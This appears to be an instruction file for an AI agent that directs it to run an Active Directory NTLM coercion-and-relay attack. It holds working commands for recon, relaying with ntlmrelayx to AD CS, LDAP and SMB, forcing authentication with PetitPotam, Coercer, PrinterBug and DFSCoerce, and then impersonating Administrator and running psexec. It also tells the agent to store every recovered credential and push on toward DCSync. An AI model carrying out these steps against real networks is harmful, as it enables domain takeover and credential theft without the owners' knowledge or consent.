Plan and execute a coercion → NTLM relay chain — the highest-value modern AD path. From the context in $ARGUMENTS, reason about which relay target is viable (LDAP / SMB / AD CS / RBCD), set up the relay, coerce authentication, and route the captured access. Write results to ~/osai/current/loot/relay_attack.md.

$ARGUMENTS = DC/target IPs, domain, known creds/context (SMB signing status, ADCS web-enrol present, MachineAccountQuota). If empty, print the recon commands to pick a relay target.

## Reason first — pick the relay target before firing
A relay needs (a) a coercible victim that will authenticate to you, and (b) a relay destination whose auth lacks the right protection. Decide the destination first:
| Destination | Precondition | Payoff |
|-------------|--------------|--------|
| **AD CS web enrol (ESC8)** | HTTP(S) enrol endpoint reachable, no EPA | cert → any user's TGT/NT hash — best payoff |
| **LDAP → RBCD** | LDAP signing NOT enforced + MachineAccountQuota>0 | set RBCD on a computer → impersonate admin |
| **LDAP → Shadow Creds** | LDAP signing off + target has msDS-KeyCredentialLink writable | add key cred → PKINIT auth |
| **SMB (relay to another host)** | target SMB signing = False/disabled | admin exec on the relayed host |

## Phase 1: Recon — is a relay viable?
```bash
# SMB signing status across the subnet (False = relayable)
netexec smb <SUBNET> --gen-relay-list relay_targets.txt
netexec smb <SUBNET> | grep -i "signing:False"
# LDAP signing / channel binding on the DC
netexec ldap <DC_IP> -u <user> -p '<pass>' -M ldap-checker
# MachineAccountQuota (need >0 for RBCD new-computer path)
netexec ldap <DC_IP> -u <user> -p '<pass>' -M maq
# AD CS: find CAs + ESC8 web enrol
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <DC_IP> -stdout -vulnerable | grep -iE "ESC8|Web Enrollment"
```

## Phase 2: Start the relay listener (ntlmrelayx)
```bash
# ESC8 — relay to AD CS web enrol, grab a cert for the victim
impacket-ntlmrelayx -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# For a user/workstation victim, use --template User

# LDAP → RBCD (auto-adds a computer if MAQ>0, sets delegation)
impacket-ntlmrelayx -t ldaps://<DC_IP> -smb2support --delegate-access

# LDAP → Shadow Credentials
impacket-ntlmrelayx -t ldaps://<DC_IP> -smb2support --shadow-credentials --shadow-target <victim$>

# SMB → exec on a signing-disabled host
impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support -c "powershell -enc <B64>"
# or dump SAM: (default action dumps hashes)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

## Phase 3: Coerce authentication (make the victim connect to you)
Point the coercion at the DC/victim; `<ATTACKER>` = your relay listener IP.
```bash
# PetitPotam (MS-EFSRPC) — classic, often works unauthenticated on unpatched
python3 PetitPotam.py <ATTACKER> <DC_IP>
python3 PetitPotam.py -u <user> -p '<pass>' <ATTACKER> <DC_IP>

# Coercer — tries every known method (EFSR/DFS/PrinterBug/etc.) automatically
coercer coerce -u <user> -p '<pass>' -t <DC_IP> -l <ATTACKER>

# PrinterBug (MS-RPRN) — SpoolSample / dementor
python3 dementor.py <ATTACKER> <DC_IP> -u <user> -p '<pass>' -d <domain>
python3 printerbug.py <domain>/<user>:'<pass>'@<DC_IP> <ATTACKER>

# DFSCoerce (MS-DFSNM)
python3 dfscoerce.py -u <user> -p '<pass>' <ATTACKER> <DC_IP>
```

## Phase 4: Cash out the relayed access
```bash
# ESC8: you now have victim.pfx → auth to get NT hash / TGT
certipy auth -pfx <victim>.pfx -dc-ip <DC_IP>

# RBCD: ntlmrelayx added FAKE$ + delegation → S4U impersonate
impacket-getST -spn cifs/<TARGET_FQDN> <domain>/FAKE$:'<pass>' -impersonate Administrator -dc-ip <DC_IP>
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>

# Shadow creds: ntlmrelayx prints the PKINIT cmd → getST/gettgtpkinit → NT hash
```

## CVE-2025-33073 — NTLM reflection (patch check)
On unpatched DCs, SMB auth can be reflected back to the DC for SYSTEM. Coerce the DC to connect to an attacker name that resolves to itself; relay SMB→SMB to the DC.
```bash
# Trigger via a crafted marshalled name; requires the DC unpatched (pre-2025-06)
# Verify patch level first: netexec smb <DC_IP> then check build vs KB5060842+
```

## Constraints that BLOCK a relay (check before wasting time)
- SMB signing enforced → no SMB relay. LDAP signing + channel binding → no LDAP relay.
- EPA on AD CS web enrol → ESC8 dead. MachineAccountQuota=0 → RBCD needs an existing owned computer.
- If all blocked → pivot to Kerberos relay / different path; log it and move on.

## Output
```
RELAY: <destination chosen>  VICTIM: <coerced host>
VIABLE BECAUSE: <the missing protection>
LISTENER: <ntlmrelayx cmd>   COERCION: <cmd used>
RESULT: <cert / RBCD / hash>  → cash-out: <cmd>
NEXT: <auth → NT hash → /osai-cred-vault --add → DCSync / psexec>
```
Log every recovered credential to /osai-cred-vault. Write to ~/osai/current/loot/relay_attack.md.
